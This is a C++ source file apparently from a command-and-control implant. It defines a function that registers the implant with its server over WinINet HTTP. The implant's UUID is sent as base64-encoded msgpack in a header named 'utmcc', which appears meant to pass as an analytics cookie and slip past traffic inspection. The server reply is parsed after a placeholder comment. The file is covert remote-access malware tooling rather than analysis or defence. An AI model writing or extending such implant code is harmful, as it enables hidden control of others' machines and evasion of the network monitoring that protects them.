#include <vector>
#include <iostream>
#include "../protocols/http_wininet/http.h"

//placeholder register func. Put somehwere in control
int register_implant() {
    std::vector<char> responseBuffer;

    // Define headers (No \r\n needed)
    std::vector<std::wstring> headers = {
        //msgpack -> b64: {"implant_uuid":"00000-00...."}
        L"utmcc: gaxpbXBsYW50X3V1aWTZIzAwMDAwMDAwLTAwMDAtMDAwMC0wMDAwLTAwMDAwMDAwMDAw"
    };

    bool http_response = HTTP_GET(headers, responseBuffer);

    if (http_response) {
        std::cout << "Success! Bytes read: " << responseBuffer.size() << std::endl;

        //then transform and pull out data we need
        //placeholer id" 019bbe19-2c0e-7ee1-a81a-78d7e1a97ac0
    }
    else {
        std::cerr << "Request failed." << std::endl;
    }

    return 0;
}